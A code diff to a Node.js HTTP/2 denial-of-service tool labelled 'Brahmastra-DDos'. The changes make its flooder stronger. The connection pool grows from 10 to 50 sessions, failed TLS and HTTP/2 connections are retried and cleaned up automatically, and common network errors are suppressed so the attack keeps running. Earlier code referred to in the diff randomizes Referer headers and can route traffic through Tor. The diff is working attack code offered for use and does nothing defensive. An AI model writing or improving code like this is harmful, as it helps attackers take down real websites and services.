@@ -9,6 +9,14 @@ process.on('uncaughtException', (err) => {
     } else if (err.message && err.message.includes('ERR_HTTP2_INVALID_SESSION')) {
         // This is expected when HTTP/2 sessions are invalid, just log it
         console.log(`[INFO] HTTP/2 session invalid - continuing operation`);
+    } else if (err.message && err.message.includes('Client network socket disconnected')) {
+        // This is expected when TLS connections fail, just log it
+        console.log(`[INFO] TLS connection failed - continuing operation`);
+    } else if (err.message && err.message.includes('ECONNRESET') || 
+               err.message && err.message.includes('ENOTFOUND') ||
+               err.message && err.message.includes('ETIMEDOUT')) {
+        // These are common network errors, just log them
+        console.log(`[INFO] Network error: ${err.message} - continuing operation`);
     } else {
         // Log unexpected errors
         console.log(`[WARNING] Uncaught exception: ${err.message}`);
@@ -534,6 +542,14 @@ if (cluster.isMaster) {
     }
     
     setInterval(getStatus, 2000);
+    
+    // Monitor connection pool health every 10 seconds
+    setInterval(() => {
+        if (typeof connectionPool !== 'undefined' && connectionPool.monitorConnections) {
+            connectionPool.monitorConnections();
+        }
+    }, 10000);
+    
          setTimeout(() => {
        console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
        
@@ -1395,11 +1411,18 @@ headers["Referer"] = randomReferer;
  
  // Connection pool to manage HTTP/2 sessions
 const connectionPool = {
-    maxConnections: 10,
+    maxConnections: 50, // Increased from 10 to 50
     activeConnections: 0,
     connections: new Set(),
+    failedConnections: 0,
+    maxFailedConnections: 100,
     
     canCreateConnection() {
+        // Allow more connections if we're not hitting failure limits
+        if (this.failedConnections > this.maxFailedConnections) {
+            // Reset failed connections counter and allow new connections
+            this.failedConnections = 0;
+        }
         return this.activeConnections < this.maxConnections;
     },
     
@@ -1415,6 +1438,33 @@ const connectionPool = {
         }
     },
     
+    markConnectionFailed() {
+        this.failedConnections++;
+        // Clean up some old connections to make room
+        if (this.activeConnections > this.maxConnections * 0.8) {
+            this.cleanupOldConnections();
+        }
+    },
+    
+    cleanupOldConnections() {
+        // Remove oldest 20% of connections
+        const connectionsArray = Array.from(this.connections);
+        const removeCount = Math.floor(this.activeConnections * 0.2);
+        
+        for (let i = 0; i < removeCount && i < connectionsArray.length; i++) {
+            try {
+                const conn = connectionsArray[i];
+                if (conn && !conn.destroyed) {
+                    conn.destroy();
+                }
+                this.connections.delete(conn);
+                this.activeConnections--;
+            } catch (err) {
+                // Ignore cleanup errors
+            }
+        }
+    },
+    
     cleanup() {
         this.connections.forEach(conn => {
             try {
@@ -1427,6 +1477,33 @@ const connectionPool = {
         });
         this.connections.clear();
         this.activeConnections = 0;
+        this.failedConnections = 0;
+    },
+    
+    // Monitor connection health
+    monitorConnections() {
+        const healthyConnections = new Set();
+        
+        this.connections.forEach(conn => {
+            try {
+                if (conn && !conn.destroyed && conn.connecting !== false) {
+                    healthyConnections.add(conn);
+                } else {
+                    // Remove unhealthy connections
+                    this.activeConnections--;
+                }
+            } catch (err) {
+                // Remove problematic connections
+                this.activeConnections--;
+            }
+        });
+        
+        this.connections = healthyConnections;
+        
+        // Log connection pool status
+        if (this.activeConnections > this.maxConnections * 0.8) {
+            console.log(`[INFO] Connection pool: ${this.activeConnections}/${this.maxConnections} connections active`);
+        }
     }
 };
 
@@ -1494,6 +1571,28 @@ function runFlooder() {
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
 
         tlsConn.setKeepAlive(true, 60 * 10000);
+        
+        // Add TLS error handling
+        tlsConn.on('error', (err) => {
+            // Mark connection as failed in the pool
+            if (typeof connectionPool !== 'undefined' && connectionPool.markConnectionFailed) {
+                connectionPool.markConnectionFailed();
+            }
+            
+            // Log TLS errors but don't crash
+            if (err.message && err.message.includes('Client network socket disconnected')) {
+                console.log(`[INFO] TLS connection failed - retrying with new connection`);
+            } else {
+                console.log(`[INFO] TLS error: ${err.message}`);
+            }
+        });
+        
+        tlsConn.on('close', () => {
+            // Connection closed, clean up
+            if (typeof connectionPool !== 'undefined' && connectionPool.markConnectionFailed) {
+                connectionPool.markConnectionFailed();
+            }
+        });
 
         // Use Tor SOCKS agent if enabled, otherwise use direct connection
         const http2Options = {
@@ -1521,14 +1620,37 @@ function runFlooder() {
 
         // Check if we can create a new connection
         if (!connectionPool.canCreateConnection()) {
-            console.log(`[INFO] Connection pool full, skipping connection creation`);
-            return;
+            // Instead of skipping, try to clean up some old connections
+            if (connectionPool.activeConnections > 0) {
+                connectionPool.cleanupOldConnections();
+                console.log(`[INFO] Cleaned up old connections, retrying...`);
+                
+                // Small delay before retry
+                setTimeout(() => {
+                    // Recursive call to retry connection creation
+                    if (connectionPool.canCreateConnection()) {
+                        runFlooder();
+                    }
+                }, 100);
+                return;
+            } else {
+                console.log(`[INFO] Connection pool full, skipping connection creation`);
+                return;
+            }
         }
 
-        const client = http2.connect(parsedTarget.href, http2Options);
-        
-        // Add to connection pool
-        connectionPool.addConnection(client);
+        let client;
+        try {
+            client = http2.connect(parsedTarget.href, http2Options);
+            
+            // Add to connection pool
+            connectionPool.addConnection(client);
+        } catch (err) {
+            // Handle connection creation errors
+            console.log(`[INFO] HTTP/2 connection failed: ${err.message}`);
+            connectionPool.markConnectionFailed();
+            return;
+        }
 
         // Set session timeout to prevent hanging
         const sessionTimeout = setTimeout(() => {
